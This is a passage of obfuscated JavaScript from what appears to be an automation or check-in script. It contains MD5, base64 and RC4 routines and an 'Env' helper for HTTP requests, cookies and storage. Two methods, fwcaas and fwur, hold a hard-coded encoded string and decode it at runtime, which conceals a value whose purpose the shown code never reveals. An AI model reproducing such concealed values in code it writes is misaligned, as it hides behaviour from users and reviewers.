    _0x17ac03 = _0x137c9b;
    _0xb75117 = _0x329403;
    _0x4d65b4 = _0x2579ae(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 0], _0x1f30f6, 3614090360);
    _0x329403 = _0x2579ae(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 1], _0x300b9d, 3905402710);
    _0x137c9b = _0x2579ae(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 2], _0x5d83d6, 606105819);
    _0x526e1d = _0x2579ae(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 3], _0x4ba9fb, 3250441966);
    _0x4d65b4 = _0x2579ae(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 4], _0x1f30f6, 4118548399);
    _0x329403 = _0x2579ae(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 5], _0x300b9d, 1200080426);
    _0x137c9b = _0x2579ae(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 6], _0x5d83d6, 2821735955);
    _0x526e1d = _0x2579ae(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 7], _0x4ba9fb, 4249261313);
    _0x4d65b4 = _0x2579ae(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 8], _0x1f30f6, 1770035416);
    _0x329403 = _0x2579ae(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 9], _0x300b9d, 2336552879);
    _0x137c9b = _0x2579ae(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 10], _0x5d83d6, 4294925233);
    _0x526e1d = _0x2579ae(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 11], _0x4ba9fb, 2304563134);
    _0x4d65b4 = _0x2579ae(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 12], _0x1f30f6, 1804603682);
    _0x329403 = _0x2579ae(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 13], _0x300b9d, 4254626195);
    _0x137c9b = _0x2579ae(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 14], _0x5d83d6, 2792965006);
    _0x526e1d = _0x2579ae(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 15], _0x4ba9fb, 1236535329);
    _0x4d65b4 = _0xc4e9df(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 1], _0x57ffba, 4129170786);
    _0x329403 = _0xc4e9df(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 6], _0x13ff12, 3225465664);
    _0x137c9b = _0xc4e9df(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 11], _0x2d9e50, 643717713);
    _0x526e1d = _0xc4e9df(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 0], _0x188046, 3921069994);
    _0x4d65b4 = _0xc4e9df(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 5], _0x57ffba, 3593408605);
    _0x329403 = _0xc4e9df(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 10], _0x13ff12, 38016083);
    _0x137c9b = _0xc4e9df(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 15], _0x2d9e50, 3634488961);
    _0x526e1d = _0xc4e9df(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 4], _0x188046, 3889429448);
    _0x4d65b4 = _0xc4e9df(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 9], _0x57ffba, 568446438);
    _0x329403 = _0xc4e9df(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 14], _0x13ff12, 3275163606);
    _0x137c9b = _0xc4e9df(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 3], _0x2d9e50, 4107603335);
    _0x526e1d = _0xc4e9df(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 8], _0x188046, 1163531501);
    _0x4d65b4 = _0xc4e9df(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 13], _0x57ffba, 2850285829);
    _0x329403 = _0xc4e9df(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 2], _0x13ff12, 4243563512);
    _0x137c9b = _0xc4e9df(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 7], _0x2d9e50, 1735328473);
    _0x526e1d = _0xc4e9df(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 12], _0x188046, 2368359562);
    _0x4d65b4 = _0x4fcace(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 5], _0x4f1f79, 4294588738);
    _0x329403 = _0x4fcace(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 8], _0x193f26, 2272392833);
    _0x137c9b = _0x4fcace(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 11], _0x58c8c1, 1839030562);
    _0x526e1d = _0x4fcace(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 14], _0x4ad188, 4259657740);
    _0x4d65b4 = _0x4fcace(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 1], _0x4f1f79, 2763975236);
    _0x329403 = _0x4fcace(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 4], _0x193f26, 1272893353);
    _0x137c9b = _0x4fcace(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 7], _0x58c8c1, 4139469664);
    _0x526e1d = _0x4fcace(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 10], _0x4ad188, 3200236656);
    _0x4d65b4 = _0x4fcace(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 13], _0x4f1f79, 681279174);
    _0x329403 = _0x4fcace(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 0], _0x193f26, 3936430074);
    _0x137c9b = _0x4fcace(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 3], _0x58c8c1, 3572445317);
    _0x526e1d = _0x4fcace(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 6], _0x4ad188, 76029189);
    _0x4d65b4 = _0x4fcace(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 9], _0x4f1f79, 3654602809);
    _0x329403 = _0x4fcace(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 12], _0x193f26, 3873151461);
    _0x137c9b = _0x4fcace(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 15], _0x58c8c1, 530742520);
    _0x526e1d = _0x4fcace(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 2], _0x4ad188, 3299628645);
    _0x4d65b4 = _0x271c82(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 0], _0x166979, 4096336452);
    _0x329403 = _0x271c82(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 7], _0x3e31a4, 1126891415);
    _0x137c9b = _0x271c82(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 14], _0x350a9a, 2878612391);
    _0x526e1d = _0x271c82(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 5], _0x2396cb, 4237533241);
    _0x4d65b4 = _0x271c82(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 12], _0x166979, 1700485571);
    _0x329403 = _0x271c82(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 3], _0x3e31a4, 2399980690);
    _0x137c9b = _0x271c82(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 10], _0x350a9a, 4293915773);
    _0x526e1d = _0x271c82(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 1], _0x2396cb, 2240044497);
    _0x4d65b4 = _0x271c82(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 8], _0x166979, 1873313359);
    _0x329403 = _0x271c82(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 15], _0x3e31a4, 4264355552);
    _0x137c9b = _0x271c82(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 6], _0x350a9a, 2734768916);
    _0x526e1d = _0x271c82(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 13], _0x2396cb, 1309151649);
    _0x4d65b4 = _0x271c82(_0x4d65b4, _0x526e1d, _0x137c9b, _0x329403, _0x45f51b[_0x182683 + 4], _0x166979, 4149444226);
    _0x329403 = _0x271c82(_0x329403, _0x4d65b4, _0x526e1d, _0x137c9b, _0x45f51b[_0x182683 + 11], _0x3e31a4, 3174756917);
    _0x137c9b = _0x271c82(_0x137c9b, _0x329403, _0x4d65b4, _0x526e1d, _0x45f51b[_0x182683 + 2], _0x350a9a, 718787259);
    _0x526e1d = _0x271c82(_0x526e1d, _0x137c9b, _0x329403, _0x4d65b4, _0x45f51b[_0x182683 + 9], _0x2396cb, 3951481745);
    _0x4d65b4 = _0x491d92(_0x4d65b4, _0x3ec6ee);
    _0x526e1d = _0x491d92(_0x526e1d, _0x4aecf8);
    _0x137c9b = _0x491d92(_0x137c9b, _0x17ac03);
    _0x329403 = _0x491d92(_0x329403, _0xb75117);
  }
  var _0x4d39c9 = _0x48214a(_0x4d65b4) + _0x48214a(_0x526e1d) + _0x48214a(_0x137c9b) + _0x48214a(_0x329403);
  return _0x4d39c9.toLowerCase();
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (_0x52c2ce) {
    var _0x2f7863 = "",
      _0x1d865e,
      _0x336d08,
      _0xa920ea,
      _0x269fc3,
      _0x41e98b,
      _0x477f2d,
      _0x4abf88,
      _0x52c8ec = 0;
    _0x52c2ce = _utf8_encode(_0x52c2ce);
    while (_0x52c8ec < _0x52c2ce.length) {
      _0x1d865e = _0x52c2ce.charCodeAt(_0x52c8ec++);
      _0x336d08 = _0x52c2ce.charCodeAt(_0x52c8ec++);
      _0xa920ea = _0x52c2ce.charCodeAt(_0x52c8ec++);
      _0x269fc3 = _0x1d865e >> 2;
      _0x41e98b = (_0x1d865e & 3) << 4 | _0x336d08 >> 4;
      _0x477f2d = (_0x336d08 & 15) << 2 | _0xa920ea >> 6;
      _0x4abf88 = _0xa920ea & 63;
      if (isNaN(_0x336d08)) {
        _0x477f2d = _0x4abf88 = 64;
      } else {
        isNaN(_0xa920ea) && (_0x4abf88 = 64);
      }
      _0x2f7863 = _0x2f7863 + _keyStr.charAt(_0x269fc3) + _keyStr.charAt(_0x41e98b) + _keyStr.charAt(_0x477f2d) + _keyStr.charAt(_0x4abf88);
    }
    return _0x2f7863;
  };
  this.decode = function (_0x577fd5) {
    var _0x10f2f5 = "",
      _0x136705,
      _0x5b2fe4,
      _0x3bf152,
      _0x441cd6,
      _0x54a4c6,
      _0x518893,
      _0x4465a1,
      _0x531770 = 0;
    _0x577fd5 = _0x577fd5.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (_0x531770 < _0x577fd5.length) {
      _0x441cd6 = _keyStr.indexOf(_0x577fd5.charAt(_0x531770++));
      _0x54a4c6 = _keyStr.indexOf(_0x577fd5.charAt(_0x531770++));
      _0x518893 = _keyStr.indexOf(_0x577fd5.charAt(_0x531770++));
      _0x4465a1 = _keyStr.indexOf(_0x577fd5.charAt(_0x531770++));
      _0x136705 = _0x441cd6 << 2 | _0x54a4c6 >> 4;
      _0x5b2fe4 = (_0x54a4c6 & 15) << 4 | _0x518893 >> 2;
      _0x3bf152 = (_0x518893 & 3) << 6 | _0x4465a1;
      _0x10f2f5 = _0x10f2f5 + String.fromCharCode(_0x136705);
      _0x518893 != 64 && (_0x10f2f5 = _0x10f2f5 + String.fromCharCode(_0x5b2fe4));
      _0x4465a1 != 64 && (_0x10f2f5 = _0x10f2f5 + String.fromCharCode(_0x3bf152));
    }
    _0x10f2f5 = _utf8_decode(_0x10f2f5);
    return _0x10f2f5;
  };
  _utf8_encode = function (_0x5b8c3c) {
    _0x5b8c3c = _0x5b8c3c.replace(/\r\n/g, "\n");
    var _0x5286be = "";
    for (var _0x4649f8 = 0; _0x4649f8 < _0x5b8c3c.length; _0x4649f8++) {
      var _0x1fbd4e = _0x5b8c3c.charCodeAt(_0x4649f8);
      if (_0x1fbd4e < 128) {
        _0x5286be += String.fromCharCode(_0x1fbd4e);
      } else {
        _0x1fbd4e > 127 && _0x1fbd4e < 2048 ? (_0x5286be += String.fromCharCode(_0x1fbd4e >> 6 | 192), _0x5286be += String.fromCharCode(_0x1fbd4e & 63 | 128)) : (_0x5286be += String.fromCharCode(_0x1fbd4e >> 12 | 224), _0x5286be += String.fromCharCode(_0x1fbd4e >> 6 & 63 | 128), _0x5286be += String.fromCharCode(_0x1fbd4e & 63 | 128));
      }
    }
    return _0x5286be;
  };
  _utf8_decode = function (_0x2640d1) {
    c1 = c2 = 0;
    var _0x6b1f79 = "",
      _0x383ea7 = 0,
      _0x1729a9 = c1;
    while (_0x383ea7 < _0x2640d1.length) {
      _0x1729a9 = _0x2640d1.charCodeAt(_0x383ea7);
      if (_0x1729a9 < 128) {
        _0x6b1f79 += String.fromCharCode(_0x1729a9);
        _0x383ea7++;
      } else {
        _0x1729a9 > 191 && _0x1729a9 < 224 ? (c2 = _0x2640d1.charCodeAt(_0x383ea7 + 1), _0x6b1f79 += String.fromCharCode((_0x1729a9 & 31) << 6 | c2 & 63), _0x383ea7 += 2) : (c2 = _0x2640d1.charCodeAt(_0x383ea7 + 1), c3 = _0x2640d1.charCodeAt(_0x383ea7 + 2), _0x6b1f79 += String.fromCharCode((_0x1729a9 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x383ea7 += 3);
      }
    }
    return _0x6b1f79;
  };
}
function rc4(_0x4462ac, _0x4c1aa3) {
  var _0x4d8bb9 = Array(256),
    _0x1616d1 = Array(_0x4462ac.length);
  for (var _0x15e23f = 0; _0x15e23f < 256; _0x15e23f++) {
    _0x4d8bb9[_0x15e23f] = _0x15e23f;
    var _0x308690 = (_0x308690 + _0x4d8bb9[_0x15e23f] + _0x4c1aa3.charCodeAt(_0x15e23f % _0x4c1aa3.length)) % 256,
      _0x3e8e4c = _0x4d8bb9[_0x15e23f];
    _0x4d8bb9[_0x15e23f] = _0x4d8bb9[_0x308690];
    _0x4d8bb9[_0x308690] = _0x3e8e4c;
  }
  for (var _0x15e23f = 0; _0x15e23f < _0x4462ac.length; _0x15e23f++) {
    _0x1616d1[_0x15e23f] = _0x4462ac.charCodeAt(_0x15e23f);
  }
  for (var _0x2b33aa = 0; _0x2b33aa < _0x1616d1.length; _0x2b33aa++) {
    var _0x15e23f = (_0x15e23f + 1) % 256,
      _0x308690 = (_0x308690 + _0x4d8bb9[_0x15e23f]) % 256,
      _0x3e8e4c = _0x4d8bb9[_0x15e23f];
    _0x4d8bb9[_0x15e23f] = _0x4d8bb9[_0x308690];
    _0x4d8bb9[_0x308690] = _0x3e8e4c;
    var _0x12ff90 = (_0x4d8bb9[_0x15e23f] + _0x4d8bb9[_0x308690] % 256) % 256;
    _0x1616d1[_0x2b33aa] = String.fromCharCode(_0x1616d1[_0x2b33aa] ^ _0x4d8bb9[_0x12ff90]);
  }
  return _0x1616d1.join("");
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `🔔${this.name}, 开始!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          n = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(n, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let s = require("iconv-lite");
            this.initGotEnv(t);
            this.got(t).on("redirect", (t, e) => {
              try {
                if (t.headers["set-cookie"]) {
                  const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  s && this.ckjar.setCookieSync(s, null);
                  e.cookieJar = this.ckjar;
                }
              } catch (t) {
                this.logErr(t);
              }
            }).then(t => {
              const {
                statusCode: i,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: i,
                statusCode: r,
                headers: o,
                rawBody: h
              }, s.decode(h, this.encoding));
            }, t => {
              const {
                message: i,
                response: r
              } = t;
              e(i, r, r && s.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(t, e = () => {}) {
      const s = t.method ? t.method.toLocaleLowerCase() : "post";
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = s;
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let i = require("iconv-lite");
            this.initGotEnv(t);
            const {
              url: r,
              ...o
            } = t;
            this.got[s](r, o).then(t => {
              const {
                statusCode: s,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: s,
                statusCode: r,
                headers: o,
                rawBody: h
              }, i.decode(h, this.encoding));
            }, t => {
              const {
                message: s,
                response: r
              } = t;
              e(s, r, r && i.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s.getMonth() + 1,
        "d+": s.getDate(),
        "H+": s.getHours(),
        "m+": s.getMinutes(),
        "s+": s.getSeconds(),
        "q+": Math.floor((s.getMonth() + 3) / 3),
        S: s.getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
        let t = ["", "==============📣系统通知📣=============="];
        t.push(e);
        s && t.push(s);
        i && t.push(i);
        console.log(t.join("\n"));
        this.logs = this.logs.concat(t);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t);
    }
    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas.decode(this.fwcaas());
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}